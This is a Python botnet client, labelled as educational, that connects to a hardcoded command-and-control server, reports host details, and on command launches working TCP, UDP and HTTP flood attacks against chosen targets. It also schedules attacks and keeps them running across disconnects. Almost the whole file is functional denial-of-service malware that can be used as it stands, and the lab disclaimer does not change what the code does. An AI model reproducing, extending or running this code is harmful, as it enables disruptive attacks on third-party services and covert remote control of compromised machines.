# bot.py - Enhanced for Educational Purposes (Final Consolidation)
# WARNING: For educational use in isolated labs ONLY. Not for real-world use.
import socket
import threading
import time
import random
import logging
import platform # For basic system info
import os # For basic info
import urllib.request # For simple HTTP requests in attack and update sim
import urllib.error
from urllib.parse import urlparse # To extract hostname/port for HTTP attack
import datetime # For scheduler
import json # For sending structured info

# --- Configuration ---
# In real scenario, use DNS or other methods, not hardcoded IP
C2_HOST = '192.168.100.15' # CHANGE THIS to C2 server's actual IP (Kali VM IP)
C2_PORT = 9999
RECONNECT_DELAY = 15 # Seconds to wait before reconnecting
SECRET_KEY = b"MySuperSecretKey123" # Must match C2 server's SECRET_KEY
# --- --- --- --- --- ---

# Setup basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - BOT - %(levelname)s - %(message)s')

# Global flag to signal threads to stop
running = True
# Thread-safe collections/variables
attack_threads = [] # Stores tuples of (thread_obj, stop_event)
attack_lock = threading.Lock()
scheduled_tasks = [] # List to hold (fire_time_obj, command_string) tuples
scheduler_lock = threading.Lock()
scheduler_thread = None # To hold the scheduler thread object
c2_socket = None # Hold the current C2 socket globally for potential use? (Careful with thread safety)
c2_socket_lock = threading.Lock()

# Simple XOR 'encryption' - Inadequate for real-world use. Use TLS.
# Demonstrates the concept of obscuring traffic, not true security.
def encrypt_decrypt(data):
    key_len = len(SECRET_KEY)
    return bytes([data[i] ^ SECRET_KEY[i % key_len] for i in range(len(data))])

# --- System Info Function ---
def get_system_info():
    """ Gathers basic system information for C2 INFO command. """
    # Basic info - Real malware gathers much more detail (and can be invasive)
    # Be mindful of privacy even in labs.
    global attack_threads, scheduled_tasks
    with attack_lock:
        is_attacking = bool(attack_threads)
    with scheduler_lock:
        num_scheduled = len(scheduled_tasks)

    info = {
        'status': 'attacking' if is_attacking else 'idle',
        'platform': platform.system(), # E.g., 'Windows', 'Linux'
        'release': platform.release(), # E.g., '10' for Win10/11, kernel version for Linux
        'user': os.getlogin() if hasattr(os, 'getlogin') else 'N/A', # Works reliably on Windows/Linux?
        'hostname': socket.gethostname(),
        'scheduled_tasks': num_scheduled,
        'current_time_utc': datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    }
    # **WARNING**: Avoid collecting sensitive info like IP addresses, MACs, detailed hardware info
    # unless specifically required and ethically justified for the educational goal.
    return info

# --- Attack Functions ---
def tcp_flood_attack(target_ip, target_port, stop_event):
    """ Performs a basic TCP connection flood. """
    logging.info(f"Starting TCP Flood on {target_ip}:{target_port}")
    connections_attempted = 0
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set a short timeout to prevent threads hanging indefinitely
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            # Send minimal data; the connection itself is the primary goal
            # Real SYN floods don't complete the handshake or send data. This simulates connection exhaustion.
            sock.sendall(b"X") # Send 1 byte
            connections_attempted += 1
        except socket.timeout:
            # Timeout is expected if the target is slow or port unreachable
            pass
        except socket.error as e:
            # Log other socket errors less frequently to avoid log spam
            # Example: Log every 100 errors of the same type? Needs state tracking.
            # logging.debug(f"TCP Flood socket error to {target_ip}:{target_port}: {e}")
            pass
        except Exception as e:
            # Log unexpected errors during the attack loop
            logging.error(f"Unexpected error during TCP Flood to {target_ip}:{target_port}: {e}")
        finally:
            # Ensure the socket is closed
            if sock:
                try: sock.close()
                except: pass
        # Small delay to prevent pure CPU spin and allow context switching
        time.sleep(0.01) # Adjust as needed for desired intensity vs CPU load

    logging.info(f"Stopped TCP Flood on {target_ip}:{target_port} after attempting ~{connections_attempted} connections.")


def udp_flood_attack(target_ip, target_port, data_size, stop_event):
    """ Performs a basic UDP flood with random data. """
    logging.info(f"Starting UDP Flood on {target_ip}:{target_port} with packet size {data_size}")
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Generate payload once if size is reasonable, or per send if very large?
        payload = random._urandom(min(data_size, 65500)) # Ensure size is valid
    except OverflowError:
        logging.warning(f"UDP flood data size {data_size} too large, defaulting to 1024.")
        payload = random._urandom(1024)
    except Exception as e:
         logging.error(f"Failed to create UDP payload: {e}")
         return # Cannot proceed without payload

    packets_sent = 0
    while not stop_event.is_set():
        try:
            udp_sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
        except socket.error as e:
            # UDP sendto is less likely to error unless network config is wrong
            # logging.debug(f"UDP Flood socket error to {target_ip}:{target_port}: {e}")
            # Slow down slightly if errors occur?
            time.sleep(0.1)
            pass
        except Exception as e:
             logging.error(f"Unexpected error during UDP Flood to {target_ip}:{target_port}: {e}")
             # Maybe stop if unexpected errors persist?
             break
        # Adjust sleep for desired packet rate. Very small values increase CPU load.
        time.sleep(0.001) # Target ~1000 pps if possible

    logging.info(f"Stopped UDP Flood on {target_ip}:{target_port} after sending ~{packets_sent} packets.")
    try: udp_sock.close()
    except: pass


def http_flood_attack(target_url, stop_event):
    """ Basic HTTP GET flood using standard Python libraries. """
    logging.info(f"Starting HTTP GET Flood on {target_url} (using urllib)")
    # Set a somewhat realistic User-Agent string
    # Real bots often randomize these from a list.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive', # Can try 'close' too
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
        }
    requests_sent = 0
    # Use a context for potential connection reuse (depends on server and urllib)
    # opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())

    while not stop_event.is_set():
        response = None
        try:
            # Create request object for each attempt to potentially vary headers slightly?
            req = urllib.request.Request(target_url, headers=headers, method='GET')
            # Use urlopen with a timeout
            response = urllib.request.urlopen(req, timeout=2.0) # Timeout in seconds
            # Read a small part of the response to ensure request was processed
            response.read(1024)
            requests_sent += 1
            # Optional: Log status code occasionally
            # if requests_sent % 50 == 0: logging.debug(f"HTTP GET to {target_url} status: {response.status}")
        except urllib.error.URLError as e:
            # Handle common network/HTTP errors (Connection refused, timeouts handled by timeout param, DNS errors, HTTP errors like 404, 503)
            # logging.debug(f"HTTP Flood URL Error for {target_url}: {e.reason}")
            pass # Continue attacking on expected errors
        except socket.timeout:
            # logging.debug(f"HTTP Flood socket timeout for {target_url}")
            pass # Continue attacking
        except Exception as e:
            logging.error(f"Unexpected HTTP Flood Error for {target_url}: {e}", exc_info=False)
            # Consider stopping or pausing if unexpected errors occur frequently
            time.sleep(1) # Pause briefly on unexpected errors
        finally:
             # Ensure response is closed if opened
             if response:
                 try: response.close()
                 except: pass
        # Randomized delay between requests to mimic user variability slightly
        time.sleep(random.uniform(0.05, 0.15))

    logging.info(f"Stopped HTTP GET Flood on {target_url} after sending ~{requests_sent} requests.")


# --- Scheduler Function ---
def run_scheduler():
    """ Checks scheduled tasks periodically and runs them if due. Runs in its own thread. """
    global scheduled_tasks, running
    logging.info("Scheduler thread started.")
    while running:
        now_time = datetime.datetime.now().time()
        tasks_to_run_cmds = []

        # Check for due tasks under lock
        with scheduler_lock:
            remaining_tasks = []
            if scheduled_tasks: # Only iterate if there are tasks
                for task_time_obj, command_str in scheduled_tasks:
                    # Compare time objects (naive comparison, ignores date/timezone)
                    # For more robustness, use full datetime objects and timezone awareness.
                    if now_time >= task_time_obj:
                        tasks_to_run_cmds.append(command_str)
                        logging.info(f"Scheduler: Time reached for task '{command_str}' scheduled at {task_time_obj.strftime('%H:%M:%S')}")
                    else:
                        # Keep tasks that are not due yet
                        remaining_tasks.append((task_time_obj, command_str))
                # Update the list with only remaining tasks
                scheduled_tasks = remaining_tasks

        # Run due tasks outside the lock to avoid holding it during command execution
        if tasks_to_run_cmds:
            for command_str in tasks_to_run_cmds:
                logging.info(f"Scheduler: Executing scheduled task '{command_str}'")
                # Use the main command handler. Pass sock=None to indicate internal execution.
                # Run in a new thread to prevent long tasks from blocking the scheduler.
                cmd_thread = threading.Thread(target=handle_command, args=(None, command_str), daemon=True)
                cmd_thread.start()

        # Sleep interval: Check tasks reasonably often without spinning CPU.
        time.sleep(1) # Check every second

    logging.info("Scheduler thread stopped.")


# --- Command Handling ---
def stop_all_attacks():
    """ Signals all active attack threads to stop. """
    global attack_threads
    stopped_count = 0
    with attack_lock:
        if not attack_threads: return # Nothing to stop
        logging.info(f"Signaling {len(attack_threads)} attack threads to stop...")
        # Iterate over a copy, as threads might modify list indirectly on exit? (Less likely with daemon threads)
        current_attacks = list(attack_threads)
        attack_threads = [] # Clear the list immediately under lock
        for thread, stop_event in current_attacks:
            try:
                 if thread.is_alive():
                     stop_event.set() # Signal thread to stop via its event
                     stopped_count += 1
                 else:
                      logging.debug("Attack thread already finished.")
            except Exception as e:
                 logging.error(f"Error signaling attack thread to stop: {e}")
        # Optional: Wait briefly for threads to actually exit? (Could block C2 comms)
        # for thread, _ in current_attacks:
        #     thread.join(timeout=0.1) # Very short wait
    logging.info(f"Attack stop signals sent to {stopped_count} active threads.")


def start_attack(command):
    """ Parses attack command and starts the corresponding attack thread. """
    global attack_threads
    parts = command.split()
    attack_type = parts[0].upper()

    # Stop any previous attacks before starting a new one (C2 usually wants one attack at a time)
    stop_all_attacks()
    # Brief pause to allow threads to potentially start stopping.
    time.sleep(0.2)

    stop_event = threading.Event()
    thread = None
    target_desc = "N/A" # For logging

    try:
        if attack_type == 'DOS' and len(parts) == 3:
             ip, port_str = parts[1], parts[2]
             # Validate input before starting thread
             socket.inet_aton(ip); port = int(port_str)
             target_desc = f"{ip}:{port} (TCP Flood)"
             thread = threading.Thread(target=tcp_flood_attack, args=(ip, port, stop_event), daemon=True)
        elif attack_type == 'UDP' and len(parts) == 4:
             ip, port_str, size_str = parts[1], parts[2], parts[3]
             # Validate input
             socket.inet_aton(ip); port = int(port_str); size = int(size_str)
             if not (0 < size <= 65500): size = 1024 # Clamp size
             target_desc = f"{ip}:{port} Size:{size} (UDP Flood)"
             thread = threading.Thread(target=udp_flood_attack, args=(ip, port, size, stop_event), daemon=True)
        elif attack_type == 'HTTP' and len(parts) == 2:
             url = parts[1]
             # Basic URL validation
             parsed_url = urlparse(url)
             if not all([parsed_url.scheme in ['http', 'https'], parsed_url.netloc]):
                 raise ValueError(f"Invalid URL format: {url}")
             target_desc = f"{url} (HTTP Flood)"
             thread = threading.Thread(target=http_flood_attack, args=(url, stop_event), daemon=True)
        else:
            logging.warning(f"Cannot start attack: Unknown or malformed command: {command}")
            return # Don't proceed if command structure is wrong

        # If a valid attack thread was created, start it and track it
        if thread:
             logging.info(f"Starting {attack_type} attack on {target_desc}")
             with attack_lock:
                 attack_threads.append((thread, stop_event))
             thread.start()

    except (ValueError, OSError, IndexError) as e: # Catch validation errors (int cast, bad IP, missing parts)
        logging.error(f"Invalid arguments for {attack_type} command '{command}': {e}")
    except Exception as e:
        logging.error(f"Failed to start attack thread for command '{command}': {e}", exc_info=True)


def handle_command(sock, cmd):
    """ Central handler for all commands received from C2 or scheduler. """
    # sock is the C2 socket object if command came from C2, None if from scheduler.
    global running, scheduled_tasks
    # Avoid logging the raw command if it could be sensitive in a real scenario
    log_cmd_display = cmd.split()[0] # Log only the verb usually
    logging.debug(f"Handling command verb: {log_cmd_display}")

    parts = cmd.split()
    command_verb = parts[0].upper()

    # --- Attack Commands ---
    if command_verb in ('DOS', 'UDP', 'HTTP'):
        # Logging handled within start_attack
        start_attack(cmd)

    # --- Control Commands ---
    elif command_verb == 'EXIT':
        logging.info("EXIT command received. Signaling shutdown.")
        running = False # Signal all loops (main, scheduler, listener) to stop
        stop_all_attacks() # Stop current attacks immediately
        # The main loop/listener will handle closing the socket after 'running' becomes False.

    # --- Info/Status Commands ---
    elif command_verb == 'INFO_REQUEST':
        if sock: # Only respond if command came directly from C2 socket
            try:
                info = get_system_info()
                info_json = json.dumps(info)
                logging.info(f"Sending INFO response: {info_json}")
                # **WARNING**: Sending info back needs careful protocol design in real malware.
                # This sends potentially large JSON over simple XOR. Prone to errors/detection.
                response_cmd = f"INFO_RESPONSE {info_json}"
                sock.sendall(encrypt_decrypt(response_cmd.encode()))
            except json.JSONDecodeError as e:
                 logging.error(f"Failed to serialize system info: {e}")
            except socket.error as e:
                 logging.error(f"Socket error sending INFO response: {e}")
                 # Assume connection might be dead if send fails
            except Exception as e:
                 logging.error(f"Unexpected error sending INFO response: {e}", exc_info=True)
        else:
            logging.warning("Ignoring INFO_REQUEST received from internal source (scheduler?).")

    elif command_verb == 'PING':
         # Optional: Respond to keepalives if needed by C2
         if sock:
             try: sock.sendall(encrypt_decrypt(b'PONG'))
             except: pass # Ignore errors sending pong
         pass # No action needed if ping is just for connection check by C2

    # --- Scheduling Commands ---
    elif command_verb == 'SCHEDULE' and len(parts) >= 3:
         time_spec = parts[1]
         actual_command = " ".join(parts[2:])
         try:
             # Parse HH:MM:SS format from C2 command
             task_time_obj = datetime.datetime.strptime(time_spec, '%H:%M:%S').time()
             # Validate the command being scheduled (simple check)
             scheduled_verb = actual_command.split()[0].upper()
             if scheduled_verb not in ['DOS', 'UDP', 'HTTP', 'EXIT', 'INFO_REQUEST']: # Add allowed scheduled commands here
                  raise ValueError(f"Command '{scheduled_verb}' cannot be scheduled.")

             with scheduler_lock:
                 scheduled_tasks.append((task_time_obj, actual_command))
             logging.info(f"Scheduled task '{actual_command}' for {time_spec}")
             # Optional: Confirm schedule back to C2 if sock is not None
             if sock:
                 ack_msg = f"ACK SCHEDULE OK {time_spec} {actual_command}"
                 try: sock.sendall(encrypt_decrypt(ack_msg.encode()))
                 except: pass # Ignore ACK send errors
         except ValueError as e:
              logging.error(f"Invalid time format or command for SCHEDULE '{cmd}': {e}")
              if sock:
                  nack_msg = f"NACK SCHEDULE FAILED InvalidFormatOrCommand '{cmd}'"
                  try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
                  except: pass # Ignore NACK send errors
         except Exception as e:
             logging.error(f"Error scheduling task '{cmd}': {e}", exc_info=True)
             if sock:
                  nack_msg = f"NACK SCHEDULE FAILED InternalError '{cmd}'"
                  try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
                  except: pass # Ignore NACK send errors

    # --- Update Command (Simulated) ---
    elif command_verb == 'UPDATE' and len(parts) == 2:
         update_url = parts[1]
         logging.warning(f"Received UPDATE command for URL: {update_url} - SIMULATING PROCESS")
         # --- SIMULATED UPDATE PROCESS ---
         # **WARNING**: This section DOES NOT perform a real update. It only simulates the steps.
         # Implementing actual self-update is highly complex and dangerous.
         sim_status = "FAILED (Simulated)" # Default status
         try:
             logging.info(f"[SIMULATION] Attempting to download update from {update_url}...")
             # Simulate download using urllib - *doesn't save or execute*
             req_sim = urllib.request.Request(update_url, headers={'User-Agent': 'BotUpdateSim/1.0'})
             with urllib.request.urlopen(req_sim, timeout=5.0) as response_sim:
                 code = response_sim.getcode()
                 if 200 <= code < 300:
                     logging.info(f"[SIMULATION] Download successful (HTTP {code}). Size: {response_sim.headers.get('Content-Length', 'N/A')}")
                     # Simulate validation (e.g., check hash, signature - not done here)
                     logging.info("[SIMULATION] Validating update package...")
                     time.sleep(0.5) # Simulate validation time
                     # In this simulation, assume download success means validation success
                     logging.warning("[SIMULATION] Update validation successful. NO ACTUAL UPDATE APPLIED.")
                     sim_status = "OK (Simulated - No Actual Update)"
                 else:
                      logging.error(f"[SIMULATION] Download failed (HTTP {code}).")
                      sim_status = f"FAILED DownloadError HTTP{code} (Simulated)"

         except urllib.error.URLError as e:
              logging.error(f"[SIMULATION] Download failed (URL Error): {e.reason}")
              sim_status = f"FAILED URLError (Simulated)"
         except socket.timeout:
              logging.error(f"[SIMULATION] Download failed (Timeout).")
              sim_status = f"FAILED Timeout (Simulated)"
         except Exception as e:
              logging.error(f"[SIMULATION] Unexpected error during simulated update: {e}", exc_info=True)
              sim_status = f"FAILED InternalError (Simulated)"

         # Report simulation result back to C2?
         if sock:
             ack_msg = f"ACK UPDATE {sim_status} URL:{update_url}"
             try: sock.sendall(encrypt_decrypt(ack_msg.encode()))
             except: pass # Ignore ACK send errors
         # --- END OF SIMULATION ---

    # --- Unknown Command ---
    else:
        logging.warning(f"Unknown command received: {cmd}")
        if sock: # Inform C2 if command unknown
             nack_msg = f"NACK UnknownCommand '{cmd.split()[0]}'"
             try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
             except: pass # Ignore NACK send errors


def listen_for_commands(sock):
    """ Listens for commands from the C2 server and passes them to the handler. """
    global running, c2_socket, c2_socket_lock
    buffer = b"" # Buffer for potentially fragmented messages
    with c2_socket_lock:
        c2_socket = sock # Store socket for potential other uses (use carefully)

    try:
        while running:
            try:
                # Receive data from C2. Use a reasonable buffer size.
                # recv() blocks until data arrives or socket closes/errors.
                data = sock.recv(4096) # Increased buffer size
                if not data:
                    # Empty data usually means C2 closed the connection gracefully.
                    logging.warning("Connection closed by C2 server (received empty data).")
                    break # Exit listener loop

                # Append received data to buffer
                buffer += data

                # Process buffer for complete commands (simple newline delimiter example)
                # Real protocols are more complex (e.g., length prefix, JSON markers)
                # Using XOR makes simple delimiters unreliable. We assume one command per recv for now.
                # A better approach: prefix each message with its length.
                # For simplicity here, decrypt the whole buffer received.
                try:
                    decrypted_data = encrypt_decrypt(buffer)
                    # Assume newline separates commands (adjust if C2 sends differently)
                    # This is fragile with XOR if newline byte appears mid-command due to XORing.
                    # Split commands based on a reliable delimiter if possible. Let's assume C2 sends one command per chunk for now.
                    cmd = decrypted_data.decode().strip()
                    if cmd: # If decoding and stripping yields something
                         handle_command(sock, cmd) # Handle the command
                    buffer = b"" # Clear buffer after processing (or handle partial commands)

                except UnicodeDecodeError:
                     logging.error("Failed to decode decrypted data. Buffer possibly corrupted or key mismatch.")
                     # Clear buffer on decode error to avoid processing garbage.
                     buffer = b""
                     # Consider breaking the connection if decode errors persist?
                except Exception as e:
                     logging.error(f"Error processing received command data: {e}", exc_info=True)
                     buffer = b"" # Clear buffer on other processing errors


            except socket.timeout:
                 # This shouldn't happen unless a timeout is set on the socket elsewhere.
                 logging.warning("Socket timeout during recv() - shouldn't occur with default blocking.")
                 continue # Continue listening
            except ConnectionResetError:
                 logging.warning("Connection reset by C2 server.")
                 break # Exit loop
            except socket.error as e:
                 # Handle other socket errors during receive
                 logging.error(f"Socket error while listening: {e}")
                 break # Assume connection lost
            except Exception as e:
                 logging.error(f"Unexpected error while listening: {e}", exc_info=True)
                 break # Exit on unknown errors

    finally:
        logging.info("Command listener stopped.")
        with c2_socket_lock:
             c2_socket = None # Clear global socket reference


def main():
    """ Main function: Connects to C2, starts scheduler, handles reconnection. """
    global running, scheduler_thread, c2_socket, c2_socket_lock

    # Start the scheduler thread once at the beginning
    if scheduler_thread is None or not scheduler_thread.is_alive():
        scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
        scheduler_thread.start()

    # Main connection and reconnection loop
    while running:
        current_sock = None # Socket for this connection attempt
        try:
            logging.info(f"Attempting to connect to C2 server {C2_HOST}:{C2_PORT}...")
            current_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set a timeout for the connection attempt itself
            current_sock.settimeout(10.0) # 10 seconds to connect
            current_sock.connect((C2_HOST, C2_PORT))
            # Disable timeout for normal blocking communication after connection
            current_sock.settimeout(None)
            logging.info("Connected to C2 server.")

            # --- Optional: Initial Registration ---
            # Send basic info on connection to help C2 identify the bot
            try:
                 initial_info = get_system_info()
                 info_msg = f"REGISTER {json.dumps(initial_info)}"
                 current_sock.sendall(encrypt_decrypt(info_msg.encode()))
                 logging.info("Sent initial registration info to C2.")
            except Exception as e:
                 logging.warning(f"Failed to send initial registration info: {e}")
            # ------------------------------------

            # Start listening for commands on this connection
            # This function blocks until the connection ends or 'running' becomes False
            listen_for_commands(current_sock)

        # Handle specific connection errors for tailored messages/actions
        except socket.timeout:
            logging.warning(f"Connection attempt to C2 timed out.")
        except ConnectionRefusedError:
             logging.warning(f"Connection refused by C2 server {C2_HOST}:{C2_PORT}. Is C2 running?")
        except socket.gaierror:
             logging.error(f"Failed to resolve C2 hostname '{C2_HOST}'. Check DNS or IP address.")
             # Maybe wait longer or stop trying if DNS fails persistently?
             time.sleep(RECONNECT_DELAY * 2) # Wait longer on DNS error
        except socket.error as e:
            # Catch other socket errors during connect or listen
            logging.warning(f"Socket Error: {e}. Assuming disconnection.")
        except Exception as e:
             # Catch unexpected errors in the main loop/connection phase
             logging.critical(f"Unexpected error in main connection loop: {e}", exc_info=True)

        # Cleanup for the current connection attempt
        finally:
            if current_sock:
                try: current_sock.close()
                except socket.error: pass
            # Ensure global socket ref is cleared if this was the active connection
            with c2_socket_lock:
                 if c2_socket is current_sock:
                     c2_socket = None
            # Critical: Do NOT stop attacks just because of a disconnect.
            # Let attacks run until explicitly stopped by C2 or EXIT command.
            # stop_all_attacks() # REMOVED - Attacks persist across disconnects

        # Wait before reconnecting, but only if 'running' is still True
        if running:
             logging.info(f"Will attempt C2 reconnection in {RECONNECT_DELAY} seconds...")
             time.sleep(RECONNECT_DELAY)
        else:
             logging.info("Running flag is false, exiting main connection loop.")

    # --- Bot Shutdown Sequence ---
    # This code runs after the main loop exits (because 'running' became False)
    logging.info("Bot main loop exited. Starting shutdown sequence...")

    # 1. Stop all attack threads
    stop_all_attacks()

    # 2. Signal scheduler thread to stop (it checks 'running' flag)
    #    and wait briefly for it to finish.
    if scheduler_thread and scheduler_thread.is_alive():
         logging.info("Waiting for scheduler thread to stop...")
         scheduler_thread.join(timeout=2.0) # Wait max 2 seconds
         if scheduler_thread.is_alive():
              logging.warning("Scheduler thread did not stop gracefully.")

    # 3. Close the C2 socket if it's somehow still open (should be closed by listener exit)
    with c2_socket_lock:
        if c2_socket:
             logging.info("Closing final C2 socket reference.")
             try: c2_socket.close()
             except: pass
             c2_socket = None

    logging.info("Bot shutdown complete.")


if __name__ == "__main__":
    # Entry point when script is run directly
    try:
        main()
    except KeyboardInterrupt:
        # Handle Ctrl+C gracefully
        logging.info("Shutdown requested via Ctrl+C.")
        running = False # Signal all loops and threads to stop
        # Note: main() loop will handle the rest of the shutdown sequence after catching the signal.
    except Exception as e:
         # Catch any unexpected errors during initial startup before main loop
         logging.critical(f"Fatal error during bot startup: {e}", exc_info=True)

    # Exit program
    logging.info("Exiting bot script.")